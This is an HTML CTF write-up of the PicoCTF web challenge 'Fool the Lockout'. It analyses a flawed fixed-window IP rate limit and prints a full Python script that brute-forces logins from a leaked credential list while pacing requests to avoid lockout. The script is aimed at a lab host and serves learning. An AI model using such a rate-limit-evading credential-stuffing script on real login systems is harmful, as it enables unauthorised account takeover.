@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fool the Lockout — Writeups</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <header>
+    <h1><a href="/">Writeups</a></h1>
+    <nav>
+    <a href="/">Home</a>
+    <a href="/linux/">Linux</a>
+    <a href="/ctf/">CTF</a>
+    <a href="/recon/">Security</a>
+  </nav>
+  </header>
+  <main>
+    
+      <h2>Web</h2>
+    
+    <div class="content">
+      <h1 id="fool-the-lockout">Fool the Lockout</h1>
+<blockquote>
+<p><strong>Category:</strong> Web | <strong>difficulty</strong> : Medium | <strong>platform</strong> : PicoCTF</p>
+</blockquote>
+<p><strong>Problem:</strong> The challenge is a login web page with faulty rate-limiting logic. We&rsquo;re given a leaked <code>username;password</code> list and expected to brute-force the login while bypassing the rate limit.</p>
+<p><strong>Solution in one line:</strong> Stay just under the server&rsquo;s max-requests-per-epoch threshold by pacing requests evenly within each window, so the lockout condition is never triggered.</p>
+<p><strong>Concepts:</strong> <code>rate-limit bypassing</code> <code>brute-forcing</code> <code>python scripting</code></p>
+<hr>
+<h2 id="the-vulnerability--concept">The vulnerability / concept</h2>
+<p><strong>Problem Statement</strong></p>
+<p>The Problem is described as such:</p>
+<p>&ldquo;Your friend is building a simple website with a login page.</p>
+<p>To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.</p>
+<p>To test their defense, they’ve:</p>
+<ul>
+<li>Created a dummy account with a random username–password pair from public credential lists.</li>
+<li>Given you those username and password lists.</li>
+<li>Shared the full source code.&rdquo;</li>
+</ul>
+<p>So the objective is to look at the source code provided in a zip file and find the flaw in the code-base. We&rsquo;re also given a credential list and told that rate-limiting is implemented, so the expectation is to brute-force the login endpoint without ever triggering the lockout.</p>
+<p>The code-base has flawed rate-limiting logic: it allows up to a set maximum number of requests within a fixed epoch (time window). Going over that limit within the window results in an IP lockout.</p>
+<p><strong>Flaws:</strong></p>
+<ul>
+<li>The password list is small enough that it can be exhausted well within the allowed request budget.</li>
+<li>The back-end&rsquo;s failed-attempt threshold is generous enough to leave a comfortable margin for iteration before a lockout is ever risked.</li>
+<li>It uses fixed-window rate-limiting instead of a sliding window or persistent, continuously-tracked counter.</li>
+</ul>
+<p><strong>Where it shows up in real life:</strong>
+This type of flaw frequently shows up when developers roll their own rate-limiting logic instead of relying on industry-standard implementations like those built into Nginx, AWS WAF, or Cloudflare. A fixed-window scheme lets an attacker send a burst of requests right before a window closes and another burst right after it reopens — effectively doubling the allowed request rate in a very small span of time.</p>
+<hr>
+<h2 id="walkthrough">Walkthrough</h2>
+<p>First of all Download the provided files, <code>app.py</code> and <code>creds-dump.txt</code>. <code>creds-dump.txt</code> holds username;password pairs, so it needs to be parsed before use.</p>
+<p>In <code>app.py</code>, three variables immediately stand out as the core of the rate-limiting logic:</p>
+<pre tabindex="0"><code>MAX_REQUESTS = 10      # max failed attempts before a user is locked out
+EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)
+LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)
+</code></pre><p>To understand the problem fully, we look at the rest of the code. Most of it is helper functions and utilities, with a few acting as the interface to the login route. Here, <code>request_rates</code> is a JSON object that tracks requests per sender IP. Two functions stand out as the actual rate-limiting logic: <code>refresh_request_rates_db</code> and <code>exceeded_rate_limit</code>.</p>
+<p>Now unto a bit of a theory part, <code>refresh_request_rates_db</code> function refreshes the database before and after a request is counted. If an IP in <code>request_rates</code> is currently locked out and the lockout period has elapsed, it resets the counter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> curr_time <span style="color:#f92672">-</span> epoch_start_time <span style="color:#f92672">&gt;</span> EPOCH_DURATION:
+</span></span><span style="display:flex;"><span>        request_rates[client_ip][<span style="color:#e6db74">&#34;num_requests&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>It also resets the counter once the epoch window has rolled over.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (lockout_end <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">and</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">&gt;=</span> lockout_end:
+</span></span><span style="display:flex;"><span>        request_rates[client_ip][<span style="color:#e6db74">&#34;lockout_until&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Function <code>refresh_request_rates_db</code> is called inside <code>exceeded_rate_limit</code> function to update the record for the requesting IP. If the IP isn&rsquo;t yet in <code>request_rates</code>, it&rsquo;s added with a request counter of 0. Each new request from that IP increments the counter as <code>request_rates[client_ip]['num_requests'] += 1</code>, and once the counter hits the limit, it triggers a lockout for <code>LOCKOUT_DURATION</code>, i.e. <code>request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION</code>.</p>
+<h2 id="solution">Solution</h2>
+<p>With the logic mapped out, the objective becomes writing a script that brute-forces the login while staying under this rate limit.
+We start by loading and parsing the credential file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_credentials</span>(path):
+</span></span><span style="display:flex;"><span>    creds <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(path, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
+</span></span><span style="display:flex;"><span>            line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line <span style="color:#f92672">or</span> line<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;#&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;;&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> line:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            user, pwd <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            creds<span style="color:#f92672">.</span>append((user<span style="color:#f92672">.</span>strip(), pwd<span style="color:#f92672">.</span>strip()))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> creds
+</span></span></code></pre></div><p>Complete script for the solution is posted below this section. The script works through the leaked credential list one pair at a time, but it paces itself so it never crosses the server&rsquo;s 10-requests-per-30-second threshold. It picks a safe budget of 9 requests per epoch and spreads them evenly across the 30 seconds (<code>spacing = EPOCH_DURATION / MAX_REQUESTS</code>), instead of firing them all at once. Before every attempt it checks whether it&rsquo;s still inside an active lockout or whether the current epoch has expired, and resets its internal counters accordingly, mirroring the same window logic the server itself uses.</p>
+<p>After each login attempt, <code>classify()</code> reads the response and sorts it into one of a few buckets — rate-limited, invalid credentials, a successful redirect, or something unexpected, so the script knows whether to back off, keep going, or stop. If the server does rate-limit it anyway, the script simply sleeps until the lockout ends and resumes from where it left off, rather than crashing or hammering the server further.</p>
+<p>After the brute-force completes or the &lsquo;Success&rsquo; indication is printed in the console, we get the username and password, using which we can login to get the flag.</p>
+<hr>
+<h2 id="code">Code</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;Rate-limit-aware login brute-forcer. Spaces requests evenly, idles out lockouts.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://xebec.cylabacademy.net:22455/login&#34;</span>
+</span></span><span style="display:flex;"><span>CREDS_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;creds-dump.txt&#34;</span>
+</span></span><span style="display:flex;"><span>MAX_REQUESTS <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>          <span style="color:#75715e"># server allows 10; stay under</span>
+</span></span><span style="display:flex;"><span>EPOCH_DURATION <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>       <span style="color:#75715e"># server epoch window</span>
+</span></span><span style="display:flex;"><span>LOCKOUT_DURATION <span style="color:#f92672">=</span> <span style="color:#ae81ff">120</span>
+</span></span><span style="display:flex;"><span>FOLLOW_REDIRECTS <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_credentials</span>(path):
+</span></span><span style="display:flex;"><span>    creds <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(path, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
+</span></span><span style="display:flex;"><span>            line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line <span style="color:#f92672">or</span> line<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;#&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;;&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> line:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            user, pwd <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            creds<span style="color:#f92672">.</span>append((user<span style="color:#f92672">.</span>strip(), pwd<span style="color:#f92672">.</span>strip()))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> creds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">classify</span>(resp):
+</span></span><span style="display:flex;"><span>    text <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>text <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Rate Limited Exceeded&#34;</span> <span style="color:#f92672">in</span> text:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;RATE_LIMITED&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Invalid username or password&#34;</span> <span style="color:#f92672">in</span> text:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;INVALID&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">in</span> (<span style="color:#ae81ff">301</span>, <span style="color:#ae81ff">302</span>, <span style="color:#ae81ff">303</span>, <span style="color:#ae81ff">307</span>, <span style="color:#ae81ff">308</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SUCCESS_REDIRECT&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;flag&#34;</span> <span style="color:#f92672">in</span> text<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SUCCESS_INDEX&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;UNKNOWN(status=</span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    creds <span style="color:#f92672">=</span> load_credentials(CREDS_FILE)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Loaded </span><span style="color:#e6db74">{</span>len(creds)<span style="color:#e6db74">}</span><span style="color:#e6db74"> creds | MAX_REQUESTS=</span><span style="color:#e6db74">{</span>MAX_REQUESTS<span style="color:#e6db74">}</span><span style="color:#e6db74"> &#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;EPOCH=</span><span style="color:#e6db74">{</span>EPOCH_DURATION<span style="color:#e6db74">}</span><span style="color:#e6db74">s LOCKOUT=</span><span style="color:#e6db74">{</span>LOCKOUT_DURATION<span style="color:#e6db74">}</span><span style="color:#e6db74">s&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    spacing <span style="color:#f92672">=</span> EPOCH_DURATION <span style="color:#f92672">/</span> MAX_REQUESTS
+</span></span><span style="display:flex;"><span>    lockout_until <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
+</span></span><span style="display:flex;"><span>    requests_this_epoch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    epoch_start <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> username, password <span style="color:#f92672">in</span> creds:
+</span></span><span style="display:flex;"><span>        now <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> now <span style="color:#f92672">&lt;</span> lockout_until:  <span style="color:#75715e"># wait out an active lockout</span>
+</span></span><span style="display:flex;"><span>            wait <span style="color:#f92672">=</span> lockout_until <span style="color:#f92672">-</span> now
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[LOCKOUT] Sleeping </span><span style="color:#e6db74">{</span>wait<span style="color:#e6db74">:</span><span style="color:#e6db74">.1f</span><span style="color:#e6db74">}</span><span style="color:#e6db74">s&#34;</span>)
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(wait)
+</span></span><span style="display:flex;"><span>            requests_this_epoch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            epoch_start <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            lockout_until <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> epoch_start <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> (time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> epoch_start) <span style="color:#f92672">&gt;=</span> EPOCH_DURATION:
+</span></span><span style="display:flex;"><span>            requests_this_epoch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            epoch_start <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> epoch_start <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            epoch_start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>            requests_this_epoch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> requests_this_epoch <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:  <span style="color:#75715e"># keep requests evenly spaced within the epoch</span>
+</span></span><span style="display:flex;"><span>            delay <span style="color:#f92672">=</span> (epoch_start <span style="color:#f92672">+</span> requests_this_epoch <span style="color:#f92672">*</span> spacing) <span style="color:#f92672">-</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> delay <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(delay)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">{</span>requests_this_epoch <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>MAX_REQUESTS<span style="color:#e6db74">}</span><span style="color:#e6db74">] Trying &#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; ...&#34;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            resp <span style="color:#f92672">=</span> SESSION<span style="color:#f92672">.</span>post(
+</span></span><span style="display:flex;"><span>                TARGET_URL,
+</span></span><span style="display:flex;"><span>                data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: username, <span style="color:#e6db74">&#34;password&#34;</span>: password},
+</span></span><span style="display:flex;"><span>                allow_redirects<span style="color:#f92672">=</span>FOLLOW_REDIRECTS,
+</span></span><span style="display:flex;"><span>                timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>,
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[ERROR] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            requests_this_epoch <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> classify(resp)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;RATE_LIMITED&#34;</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[RATE LIMITED] Locking out for </span><span style="color:#e6db74">{</span>LOCKOUT_DURATION<span style="color:#e6db74">}</span><span style="color:#e6db74">s&#34;</span>)
+</span></span><span style="display:flex;"><span>            lockout_until <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">+</span> LOCKOUT_DURATION
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;INVALID&#34;</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[FAIL] Invalid credentials&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;SUCCESS_REDIRECT&#34;</span>, <span style="color:#e6db74">&#34;SUCCESS_INDEX&#34;</span>):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[SUCCESS] Logged in as &#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">] Unexpected response&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        requests_this_epoch <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Done.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><hr>
+<p>Unlike usual CTFs, just remaining under the rate limit for solving the problem was enough because the password list was small, and the rate-limit allowed much generous rate of request. There could definitely be some clever edge cases for this problem, which would work for more realistic situations involving longer list of credential and stricter rate-limiting.
+I personally took this CTF as topic to learn the code base and write scripts accordingly rather than using the edge-cases to break past the authentication. Using Sliding window or modified sliding window or persistent counter would make the solution more complicated.</p>
+
+    </div>
+  </main>
+  <footer>
+    <p>Hosted on GitHub Pages. Main site: <a href="https://aayush-lamsal.vercel.app">aayush-lamsal.vercel.app</a></p>
+  </footer>
+</body>
+</html>
